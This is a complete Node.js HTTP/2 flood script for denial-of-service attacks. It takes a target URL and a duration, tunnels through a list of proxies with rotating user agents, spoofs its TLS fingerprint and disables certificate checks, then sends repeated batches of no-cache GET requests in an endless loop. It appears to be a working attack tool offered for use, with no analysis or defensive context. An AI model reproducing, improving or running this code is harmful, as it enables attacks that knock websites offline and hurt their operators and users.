const fs = require('fs');
const url = require('url');
const http = require('http');
const tls = require('tls');
const crypto = require('crypto');
const http2 = require('http2');

require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

let payload = {};

// Load proxies
let proxies;
try {
    proxies = fs.readFileSync("proxy.txt", 'utf-8').split('\n').map(line => line.trim()).filter(Boolean);
} catch (error) {
    console.error('Proxy file not found: "proxy.txt".');
    process.exit(1);
}

// Load user agents
let userAgents;
try {
    userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').map(line => line.trim()).filter(Boolean);
} catch (error) {
    console.error('Failed to load "ua.txt".');
    process.exit(1);
}

// Parse target URL
let targetUrl;
let parsedUrl;
try {
    targetUrl = process.argv[2];
    parsedUrl = url.parse(targetUrl);
} catch (error) {
    console.error('Failed to load target URL.');
    process.exit(1);
}

const sigalgs = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
].join(':');

class TlsBuilder {
    constructor(socket) {
        this.socket = socket;
        this.curve = "GREASE:X25519:x25519";
        this.sigalgs = sigalgs;
        this.options = crypto.constants.SSL_OP_NO_RENEGOTIATION |
            crypto.constants.SSL_OP_NO_TICKET |
            crypto.constants.SSL_OP_NO_SSLv2 |
            crypto.constants.SSL_OP_NO_SSLv3 |
            crypto.constants.SSL_OP_NO_COMPRESSION |
            crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
            crypto.constants.SSL_OP_TLSEXT_PADDING |
            crypto.constants.SSL_OP_ALL;
    }

    createHttp2Tunnel() {
        this.socket.setKeepAlive(true, 1000);
        payload[":method"] = "GET";
        payload["Referer"] = targetUrl;
        payload["User-agent"] = userAgents[Math.floor(Math.random() * userAgents.length)];
        payload["Cache-Control"] = 'no-cache, no-store, private, max-age=0, must-revalidate';
        payload["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        payload["Accept-Encoding"] = 'gzip, deflate, br';
        payload["Accept-Language"] = 'en-US,en;q=0.9';
        payload[":path"] = parsedUrl.path;

        const tunnel = http2.connect(parsedUrl.href, {
            createConnection: () => tls.connect({
                socket: this.socket,
                ciphers: tls.getCiphers().join(':') + ":TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256:HIGH:!aNULL:!kRSA:!MD5:!RC4",
                host: parsedUrl.host,
                servername: parsedUrl.host,
                secure: true,
                honorCipherOrder: true,
                secureOptions: this.options,
                sigalgs: this.sigalgs,
                rejectUnauthorized: false,
                ALPNProtocols: ['h2']
            }, () => {
                for (let i = 0; i < 10; i++) {
                    tunnel.request(payload).on('response', (headers) => {
                        console.log("Response Headers:", headers);
                    }).on('error', (err) => {
                        console.error("Request Error:", err.message);
                    }).end();
                }
            })
        });

        tunnel.on('error', (err) => {
            console.error("Tunnel Connection Error:", err.message);
        });
    }
}

function startAttack() {
    proxies.forEach(proxy => {
        const [proxyHost, proxyPort] = proxy.split(':');
        const port = parseInt(proxyPort, 10);

        // Validate the proxy port to ensure it is within the correct range
        if (isNaN(port) || port < 0 || port >= 65536) {
            console.error(`Invalid proxy port: ${proxyPort} in proxy ${proxy}`);
            return;
        }

        const req = http.get({
            host: proxyHost,
            port: port,
            method: "CONNECT",
            path: `${parsedUrl.host}:443`
        });

        req.on('connect', (res, socket) => {
            console.log(`Connected to proxy ${proxyHost}:${port}`);
            const tlsBuilder = new TlsBuilder(socket);
            tlsBuilder.createHttp2Tunnel();
        });

        req.on('error', (err) => {
            console.error(`Error connecting to proxy ${proxyHost}:${port}:`, err.message);
        });
    });
}

// Continuously run the attack
setImmediate(function attackLoop() {
    startAttack();
    setImmediate(attackLoop);
});

// Stop attack after the specified duration
setTimeout(() => process.exit(), process.argv[3] * 1000);

process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err.message));
process.on('unhandledRejection', (err) => console.error('Unhandled Rejection:', err.message));
